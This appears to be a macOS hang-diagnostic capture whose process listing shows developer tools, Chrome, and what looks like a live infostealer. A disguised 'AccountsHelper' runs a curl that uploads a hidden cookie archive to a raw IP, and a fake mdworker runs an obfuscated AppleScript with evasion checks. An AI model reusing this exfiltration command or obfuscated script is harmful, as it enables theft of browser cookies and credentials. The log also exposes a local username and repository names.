=== SUSPECTED HANG CAPTURE 2026-06-15T01:04:50Z elapsed=121s node-claude-pid=42587 ===
log_bytes=       0 deadline=1800s
--- ps -ef ---
  UID   PID  PPID   C STIME   TTY           TIME CMD
  501 42608 42587   0 10:02오전 ??         0:00.16 node /Users/rexxa/.claude/plugins/cache/omc/oh-my-claudecode/4.4.5/bridge/mcp-server.cjs
  501 42609 42587   0 10:02오전 ??         0:00.14 node /Users/rexxa/.claude/plugins/cache/omc/oh-my-claudecode/4.4.5/bridge/team-mcp.cjs
  501 42637 42587   0 10:02오전 ??         0:00.93 npm exec @modelcontextprotocol/server-github   
  501 42638 42587   0 10:02오전 ??         0:01.00 npm exec @agentmemory/mcp   
  501 42643 42587   0 10:02오전 ??         0:00.94 npm exec firecrawl-mcp   
  501 42698 42637   0 10:02오전 ??         0:00.18 node /Users/rexxa/.npm/_npx/3dfbf5a9eea4a1b3/node_modules/.bin/mcp-server-github
  501 42712 42643   0 10:02오전 ??         0:00.31 node /Users/rexxa/.npm/_npx/12b05d58670d8359/node_modules/.bin/firecrawl-mcp
  501 42726 42638   0 10:02오전 ??         0:00.10 node /Users/rexxa/.npm/_npx/ba4b5775a0ab44e2/node_modules/.bin/agentmemory-mcp
  501 42727 42587   0 10:02오전 ??         0:00.06 node /opt/homebrew/bin/codex mcp-server
  501 42728 42727   0 10:02오전 ??         0:00.05 /opt/homebrew/lib/node_modules/@openai/codex/node_modules/@openai/codex-darwin-arm64/vendor/aarch64-apple-darwin/bin/codex mcp-server
  501 42742     1   0 10:02오전 ??         0:00.19 /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared -s mdworker -c MDSImporterWorker -m com.apple.mdworker.shared
  501 43578     1   0 수02오후 ??        91:14.82 /Applications/Google Chrome.app/Contents/MacOS/Google Chrome
  501 43580     1   0 수02오후 ??         0:01.03 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/Users/rexxa/Library/Application Support/Google/Chrome/Crashpad --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=plat=OS X --annotation=prod=Chrome_Mac --annotation=ver=149.0.7827.54 --handshake-fd=5
  501 43585 43578   0 수02오후 ??       546:01.04 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper --type=gpu-process --gpu-preferences=SAAAAAAAAAAgAQAEAAAAAAAAAAAAAGAAAwAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAA== --shared-files --metrics-shmem-handle=1752395122,r,16199333280747905992,1985281334408115432,262144 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190708988185955192 --seatbelt-client=28
  501 43587 43578   0 수02오후 ??         0:42.20 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper --type=utility --utility-sub-type=storage.mojom.StorageService --lang=ko --service-sandbox-type=service --shared-files --metrics-shmem-handle=1752395122,r,11108975581764979994,7373360449469972552,524288 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190708990060038890 --seatbelt-client=34
  501 43667     1   0 수02오후 ??         0:54.25 /System/Library/PrivateFrameworks/SafariPlatformSupport.framework/Versions/A/XPCServices/com.apple.SafariPlatformSupport.Helper.xpc/Contents/MacOS/com.apple.SafariPlatformSupport.Helper
  501 43670 43578   0 수02오후 ??        16:31.52 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=19 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=233166804599 --shared-files --metrics-shmem-handle=1752395122,r,4574725799659851856,7548106316150217474,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190709004115666625 --seatbelt-client=281
  501 43712 43578   0 수02오후 ??         0:21.53 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper --type=utility --utility-sub-type=audio.mojom.AudioService --lang=ko --service-sandbox-type=audio --message-loop-type-ui --shared-files --metrics-shmem-handle=1752395122,r,2601750858562883560,5919803600690270433,524288 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190709012549043266 --seatbelt-client=296
  501 43713 43578   0 수02오후 ??         1:12.06 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper --type=utility --utility-sub-type=video_capture.mojom.VideoCaptureService --lang=ko --service-sandbox-type=none --message-loop-type-ui --shared-files --metrics-shmem-handle=1752395122,r,4303736099235343197,3179939962810594773,524288 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190709013486085115
  501 43767 43578   0 수02오후 ??        22:28.22 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=32 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=233173005727 --shared-files --metrics-shmem-handle=1752395122,r,9753199650982077621,18106476844616932368,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190709016297210662 --seatbelt-client=313
  501 43909 43578   0 수02오후 ??         2:06.45 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=55 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=233183801240 --shared-files --metrics-shmem-handle=1752395122,r,9793686635730101044,10480140030249922167,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190709037849173189 --seatbelt-client=26
  501 43911 18237   0 11:36오후 ??         0:00.35 node /Users/rexxa/.codex/plugins/cache/sisyphuslabs/omo/4.9.2/mcp/lsp/dist/cli.js mcp
  501 43914 18237   0 11:36오후 ??         0:00.01 /Applications/Codex.app/Contents/Resources/node_repl
  501 43915 43914   0 11:36오후 ??         0:00.95 /Applications/Codex.app/Contents/Resources/codex app-server --listen stdio://
  501 44331     1   0 10:03오전 ??         0:00.47 /usr/libexec/tipsd
  501 44332     1   0 10:03오전 ??         0:00.50 /System/Library/PrivateFrameworks/HelpData.framework/Versions/A/Resources/helpd
  200 44333     1   0 10:03오전 ??         0:00.15 /System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Support/softwareupdated
    0 44334     1   0 10:03오전 ??         0:00.07 /System/Library/PrivateFrameworks/MobileSoftwareUpdate.framework/Versions/A/XPCServices/com.apple.MobileSoftwareUpdate.CleanupPreparePathService.xpc/Contents/MacOS/com.apple.MobileSoftwareUpdate.CleanupPreparePathService
  501 44395     1   0 10:03오전 ??         0:00.02 /System/Library/PrivateFrameworks/IASUtilities.framework/Versions/A/Resources/installerauthagent
  200 44396     1   0 10:03오전 ??         0:00.14 /usr/libexec/NRDUpdated
    0 44415     1   0 10:03오전 ??         0:00.07 /System/Library/AssetsV2/com_apple_MobileAsset_RecoveryOSUpdateBrain/7a84bd1c89069f2e742ece792e84523266f36fdf.asset/AssetData/com.apple.NRD.UpdateBrainService.xpc/Contents/MacOS/com.apple.NRD.UpdateBrainService
  200 44418     1   0 10:03오전 ??         0:00.37 /System/Library/PrivateFrameworks/UIFoundation.framework/Versions/A/XPCServices/nsattributedstringagent.xpc/Contents/MacOS/nsattributedstringagent
  200 44431     1   0 10:03오전 ??         0:00.04 /System/Library/Frameworks/ApplicationServices.framework/Versions/A/Frameworks/HIServices.framework/Versions/A/XPCServices/com.apple.hiservices-xpcservice.xpc/Contents/MacOS/com.apple.hiservices-xpcservice
  200 44432     1   0 10:03오전 ??         0:00.05 /usr/sbin/cfprefsd agent
  200 44435     1   0 10:03오전 ??         0:00.08 /System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.GPU.xpc/Contents/MacOS/com.apple.WebKit.GPU
  200 44441     1   0 10:03오전 ??         0:00.04 /System/Library/Frameworks/MediaAccessibility.framework/Versions/A/XPCServices/com.apple.accessibility.mediaaccessibilityd.xpc/Contents/MacOS/com.apple.accessibility.mediaaccessibilityd
  501 44444     1   0 10:03오전 ??         0:00.08 /System/Library/Frameworks/WebKit.framework/Versions/A/XPCServices/com.apple.WebKit.GPU.xpc/Contents/MacOS/com.apple.WebKit.GPU
  501 44447     1   0 10:03오전 ??         0:00.04 /System/Library/Frameworks/MediaAccessibility.framework/Versions/A/XPCServices/com.apple.accessibility.mediaaccessibilityd.xpc/Contents/MacOS/com.apple.accessibility.mediaaccessibilityd
  501 44449     1   0 10:03오전 ??         0:00.07 /usr/libexec/pkd
  501 44450     1   0 10:03오전 ??         0:00.04 /System/Library/Frameworks/AudioToolbox.framework/XPCServices/com.apple.audio.SandboxHelper.xpc/Contents/MacOS/com.apple.audio.SandboxHelper
    0 44511     1   0 토10오전 ??         0:02.90 /System/Library/PrivateFrameworks/CloudKitDaemon.framework/Support/cloudd --system
  501 44945     1   0 10:04오전 ??         0:00.28 /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared -s mdworker -c MDSImporterWorker -m com.apple.mdworker.shared
  501 45016 18237   0  1:51오전 ??         0:00.01 /Applications/Codex.app/Contents/Resources/node_repl
  501 45017 18237   0  1:51오전 ??         0:00.28 node /Users/rexxa/.codex/plugins/cache/sisyphuslabs/omo/4.9.2/mcp/lsp/dist/cli.js mcp
  501 45018 45016   0  1:51오전 ??         0:00.70 /Applications/Codex.app/Contents/Resources/codex app-server --listen stdio://
  501 45516     1   0 10:04오전 ??         0:00.07 /usr/libexec/assessmentagent
  501 45616   609   0 10:04오전 ??         0:00.00 /Users/rexxa/Library/Application Support/.com.apple.accountsd/AccountsHelper
  501 45617 45616   0 10:04오전 ??         0:00.01 /bin/zsh -s
  501 45637 45617   0 10:04오전 ??         0:00.01 curl --connect-timeout 30 --max-time 120 -X POST -H bot_uid: 2M8c8hTBFWpq1BZf7UArXA== -F file=@/tmp/.ck_45617.zip http://165.227.153.3/api/cookies
  501 45687     1   0 10:04오전 ??         0:00.21 /System/Library/PrivateFrameworks/IntelligenceFlowRuntime.framework/Versions/A/intelligenceflowd
  247 45692     1   0 10:04오전 ??         0:00.07 /usr/libexec/gamecontrollerd
  501 45693     1   0 10:04오전 ??         0:00.05 /usr/libexec/gamecontrolleragentd
  501 45695     1   0 10:04오전 ??         0:00.03 /usr/libexec/feedbackd
  501 45783     1   0 10:04오전 ??         0:00.11 /System/Library/Frameworks/CoreTelephony.framework/Support/CommCenter -L
    0 45863     1   0 10:04오전 ??         0:00.02 /usr/libexec/online-auth-agent
  501 45865     1   0 10:04오전 ??         0:00.06 /System/Library/PrivateFrameworks/CommerceKit.framework/Versions/A/Resources/commerce
  501 45876     1   0 10:04오전 ??         0:02.01 /usr/libexec/replayd
  269 45946     1   0 10:04오전 ??         0:00.08 /usr/libexec/ReportMemoryException
  262 46067     1   0  7 6월26 ??         0:44.74 /usr/libexec/cameracaptured
  501 46121 18165   0 10:04오전 ??         0:00.08 gh pr list --head develop --author @me --state all --json number,url,state
  501 46131 18165   0 10:04오전 ??         0:00.01 /Library/Developer/CommandLineTools/usr/bin/git -c core.hooksPath=/dev/null -c core.fsmonitor=true remote show jw-private
  501 46137 46131   0 10:04오전 ??         0:00.00 /Library/Developer/CommandLineTools/usr/libexec/git-core/git remote-https jw-private https://github.com/hyunlord/jw-market.git
  501 46138 46137   0 10:04오전 ??         0:00.01 /Library/Developer/CommandLineTools/usr/libexec/git-core/git-remote-https jw-private https://github.com/hyunlord/jw-market.git
    0 46189 90812   0 10:04오전 ??         0:00.01 /Users/rexxa/Library/Application Support/.com.apple.metadata.mds/mdworker_shared
    0 46190 90812   0 10:04오전 ??         0:00.00 sleep 5
    0 46191 46189   0 10:04오전 ??         0:00.11 osascript -e \012on efzxgxfrkd(rlinvrt, ldldihdpb)\012set hsbwtmo to ""\012set hganxueerv to 0\012repeat with jlxdpe from 1 to count of rlinvrt\012set hganxueerv to (hganxueerv + (item jlxdpe of rlinvrt)) mod 9999\012set hsbwtmo to hsbwtmo & (character id ((item jlxdpe of rlinvrt) - (item jlxdpe of ldldihdpb)))\012end repeat\012return hsbwtmo\012end efzxgxfrkd\012\012set cxjsgg to efzxgxfrkd({250, 173, 234, 341, 218, 248, 290, 207, 243, 318, 205, 337, 281, 197, 276}, {135, 52, 119, 225, 117, 139, 195, 95, 129, 207, 103, 232, 173, 96, 162}) & " " & efzxgxfrkd({300, 277, 319, 191, 355, 290, 173, 340, 120, 317, 178, 255, 185, 221, 229, 349}, {217, 197, 242, 90, 246, 179, 59, 219, 52, 220, 62, 158, 101, 100, 117, 248})\012set ysxbebsp to efzxgxfrkd({250, 173, 234, 341, 218, 248, 290, 207, 243, 318, 205, 337, 281, 197, 276}, {135, 52, 119, 225, 117, 139, 195, 95, 129, 207, 103, 232, 173, 96, 162}) & " " & efzxgxfrkd({300, 274, 269, 342, 301, 242, 179, 317, 291, 275, 202, 301, 241, 344, 300, 361, 282, 247}, {217, 194, 197, 245, 187, 142, 60, 220, 177, 174, 134, 204, 125, 247, 216, 240, 170, 146})\012set rtxwox to do shell script cxjsgg\012set iyjocjnmk to do shell script ysxbebsp\012\012if iyjocjnmk contains efzxgxfrkd({232, 284, 288, 285, 186, 242, 307, 255, 162, 138}, {142, 214, 236, 217, 102, 168, 225, 187, 85, 68}) then\012do shell script "exit 0"\012return\012end if\012\012if iyjocjnmk contains efzxgxfrkd({208, 143, 163, 161, 139, 148, 192, 279, 268, 178, 304, 102, 142, 241, 209, 250, 276, 294, 187, 285, 183, 281, 237, 139, 238, 246, 221, 211, 258, 175, 188, 124, 171, 225, 103, 148}, {159, 89, 111, 112, 82, 98, 136, 226, 223, 128, 249, 53, 93, 196, 156, 196, 206, 239, 142, 220, 126, 212, 169, 94, 168, 194, 172, 142, 203, 122, 138, 55, 122, 177, 55, 91}) then\012do shell script "exit 0"\012return\012end if\012\012set wgwcojts to {efzxgxfrkd({169, 195, 213, 253}, {88, 126, 136, 168}), efzxgxfrkd({175, 214, 245, 346, 217, 342}, {89, 137, 126, 249, 103, 241}), efzxgxfrkd({306, 180, 189}, {231, 94, 112})}\012set rywqhboyan to {efzxgxfrkd({228, 135, 196, 123, 147, 337, 171, 318, 292, 305}, {138, 84, 147, 53, 75, 249, 82, 237, 244, 231}), efzxgxfrkd({195, 197, 105, 232, 208, 169, 237, 324, 197, 121, 150, 158}, {128, 149, 50, 148, 155, 121, 181, 240, 126, 72, 76, 108}), efzxgxfrkd({177, 116, 265, 255, 209, 256, 206, 164, 126, 201, 113, 134}, {110, 68, 215, 171, 132, 206, 116, 98, 54, 113, 57, 79}), efzxgxfrkd({166, 210, 238, 299, 209, 188, 318, 259, 220, 288, 199, 295, 255}, {99, 106, 133, 187, 151, 156, 233, 149, 113, 178, 88, 176, 145}), efzxgxfrkd({223, 227, 335, 227, 173, 138, 153, 247, 328, 271, 88, 102}, {150, 117, 219, 126, 65, 106, 86, 136, 214, 170, 56, 52}), efzxgxfrkd({267, 322, 204, 228, 283, 180, 220, 159, 146, 187, 221, 246, 230, 322, 241}, {181, 217, 90, 112, 166, 83, 112, 127, 69, 90, 122, 142, 125, 212, 140}), efzxgxfrkd({139, 337, 348, 236, 332, 195, 204, 301, 261, 296}, {53, 232, 234, 120, 215, 98, 96, 224, 164, 197}), efzxgxfrkd({287, 257, 350, 348, 292, 315, 321, 215, 236}, {247, 171, 245, 234, 176, 198, 224, 107, 195}), efzxgxfrkd({167, 167, 188, 230, 230, 360, 283, 245, 283, 225, 177, 332, 277, 331, 185, 180, 188, 353, 314, 326, 163, 306, 243}, {87, 53, 77, 131, 129, 245, 168, 134, 169, 193, 99, 235, 168, 230, 127, 148, 103, 243, 207, 216, 52, 187, 133})}\012\012set kdjllcgkby to false\012repeat with snvkffauq in wgwcojts\012if rtxwox contains snvkffauq then\012set kdjllcgkby to true\012exit repeat\012end if\012end repeat\012\012if not kdjllcgkby then\012repeat with snvkffauq in rywqhboyan\012if iyjocjnmk contains snvkffauq then\012set kdjllcgkby to true\012exit repeat\012end if\012end repeat\012end if\012\012if kdjllcgkby then\012do shell script "exit 100"\012else\012do shell script "exit 0"\012end if\012
    0 46193 46191   0 10:04오전 ??         0:00.02 system_profiler SPMemoryDataType
    0 46196 46193   0 10:04오전 ??         0:00.04 /usr/sbin/system_profiler -nospawn -xml SPMemoryDataType -detailLevel full
  501 46209 46138   0 10:04오전 ??         0:00.00 /opt/homebrew/bin/gh auth git-credential store
    0 46210 42582   0 10:04오전 ??         0:00.00 ps -ef
  501 48340     1   0 금07오전 ??         0:21.45 /System/Library/PrivateFrameworks/HomeKitDaemon.framework/Support/homed
  501 49638     1   0 금03오전 ??         0:05.91 /System/Library/PrivateFrameworks/iTunesCloud.framework/Support/itunescloudd
  501 51674     1   0  4:04오전 ??         0:02.70 /System/Library/PrivateFrameworks/SoftwareUpdate.framework/Resources/SoftwareUpdateNotificationManager.app/Contents/MacOS/SoftwareUpdateNotificationManager
  501 51675     1   0  4:04오전 ??         0:05.14 /System/Library/PrivateFrameworks/UIFoundation.framework/Versions/A/XPCServices/nsattributedstringagent.xpc/Contents/MacOS/nsattributedstringagent
  501 51999     1   0  4:05오전 ??         0:01.73 /System/Library/PrivateFrameworks/AppStoreDaemon.framework/Support/appstoreagent
  501 54141     1   0 토06오전 ??         4:30.24 /System/Library/PrivateFrameworks/VoiceShortcuts.framework/Versions/A/Support/siriactionsd
  501 54522     1   0 목11오후 ??         0:06.71 /System/Library/PrivateFrameworks/MobileTimer.framework/Executables/mobiletimerd
  501 54944     1   0 금02오전 ??         0:00.36 /System/Library/PrivateFrameworks/CoreRecents.framework/Versions/A/Support/recentsd
  501 56498 43578   0 목04오후 ??        36:56.27 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=1718 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=318595165570 --shared-files --metrics-shmem-handle=1752395122,r,7628732676702713612,9949464803136705745,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190710596149768076 --seatbelt-client=216
  501 56618     1   0 금11오전 ??         0:24.53 /System/Library/PrivateFrameworks/CoreSuggestions.framework/Versions/A/Support/suggestd
  282 57610     1   0 목01오후 ??        47:14.92 /usr/libexec/trustd
    0 58039     1   0 목01오후 ??         0:41.69 /usr/libexec/containermanagerd_system --runmode=privileged --user-container-mode=current --bundle-container-mode=global --bundle-container-owner=_appinstalld --system-container-mode=none
    0 58041     1   0 목01오후 ??         1:12.40 /System/Library/PrivateFrameworks/CoreSymbolication.framework/coresymbolicationd
    0 58122     1   0 목01오후 ??         5:15.81 /usr/libexec/gamepolicyd
  501 58133     1   0 목01오후 ??         1:48.41 /System/Library/Frameworks/Accounts.framework/Versions/A/Support/accountsd
    0 58151     1   0 목01오후 ??        38:08.33 /usr/libexec/sysmond
  501 58159     1   0 목01오후 ??         4:51.06 /usr/libexec/trustd --agent
  501 58160     1   0 목01오후 ??        34:38.87 /usr/libexec/GamePolicyAgent
    0 58170     1   0 목01오후 ??        17:09.15 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
    0 58172     1   0 목01오후 ??         0:51.11 /System/Library/CoreServices/ReportCrash daemon
    0 58176     1   0 목01오후 ??         2:52.14 /System/Library/Frameworks/Security.framework/Versions/A/XPCServices/com.apple.CodeSigningHelper.xpc/Contents/MacOS/com.apple.CodeSigningHelper
    0 58182     1   0 목01오후 ??         1:31.30 /usr/libexec/sandboxd
  501 58184     1   0 목01오후 ??         3:44.83 /System/Library/CoreServices/CoreServicesUIAgent.app/Contents/MacOS/CoreServicesUIAgent
    0 58187     1   0 목01오후 ??         0:21.91 /usr/sbin/WirelessRadioManagerd
  501 58192     1   0 목01오후 ??         0:14.82 /System/Library/Frameworks/NetFS.framework/Versions/A/XPCServices/PlugInLibraryService.xpc/Contents/MacOS/PlugInLibraryService
  501 58490     1   0 목01오후 ??        42:17.95 /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder
    0 59671     1   0 금08오후 ??         0:37.11 /usr/libexec/mobileactivationd
  501 59797     1   0 월11오전 ??         0:02.62 /System/Library/PrivateFrameworks/CoreFollowUp.framework/Versions/A/Support/followupd
  501 60502     1   0 월11오전 ??         2:58.65 /System/Library/Frameworks/Contacts.framework/Support/contactsd
  501 62485     1   0  7:21오전 ??         0:01.19 /System/Library/CoreServices/TextInputSwitcher.app/Contents/MacOS/TextInputSwitcher
  501 62537     1   0  7:21오전 ??         0:00.65 /System/Cryptexes/App/usr/libexec/AuthenticationServicesAgent
  501 62575     1   0 목07오전 ??         0:00.07 /System/Library/CoreServices/Setup Assistant.app/Contents/Resources/mbuseragent
    0 63815     1   0  8:50오전 ??         0:57.99 /usr/libexec/PerfPowerServices
  501 64232     1   0  9:17오전 ??         0:00.57 /System/Library/Frameworks/LocalAuthentication.framework/Support/coreautha.bundle/Contents/MacOS/coreautha
  222 64239     1   0  9:17오전 ??         0:00.14 /usr/sbin/netbiosd
  501 64564     1   0 화08오전 ??         0:07.39 /System/Library/Frameworks/LocalAuthentication.framework/Support/coreauthd
  501 64567 43578   0  9:17오전 ??         0:07.12 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=4449 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=613753312556 --shared-files --metrics-shmem-handle=1752395122,r,17639412430444340074,13121907178394598452,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190713155211057695 --seatbelt-client=60
  501 64572     1   0  9:17오전 ??         0:02.61 /System/Library/CoreServices/Dock.app/Contents/XPCServices/DockHelper.xpc/Contents/MacOS/DockHelper
  501 64682 43578   0  9:17오전 ??         0:02.03 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --extension-process --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=4458 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=613768464714 --shared-files --metrics-shmem-handle=1752395122,r,8919354509950795375,12115172799052759825,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190713163644434336 --seatbelt-client=341
  501 64712 43578   0  9:18오전 ??         0:00.27 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=4464 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=613770104425 --shared-files --metrics-shmem-handle=1752395122,r,3977588066822272213,1663563716337832423,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190713169266685430 --seatbelt-client=376
  501 64718 43578   0  9:18오전 ??         0:48.94 /Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework.framework/Versions/149.0.7827.54/Helpers/Google Chrome Helper (Renderer).app/Contents/MacOS/Google Chrome Helper (Renderer) --type=renderer --origin-trial-disabled-features=CanvasTextNg|WebAssemblyCustomDescriptors --lang=ko --num-raster-threads=4 --enable-zero-copy --enable-gpu-memory-buffer-compositor-resources --enable-main-frame-before-activation --renderer-client-id=4470 --time-ticks-at-unix-epoch=-1780837318995350 --launch-time-ticks=613771906298 --shared-files --metrics-shmem-handle=1752395122,r,3530648291388776911,13497070784102922971,2097152 --field-trial-handle=1718379636,r,15381062003043320505,14251116382665503521,262144 --variations-seed-version --pseudonymization-salt-handle=1935764596,r,6643408758771656220,10412330352990354329,4 --trace-process-track-uuid=3190713174888936524 --seatbelt-client=379
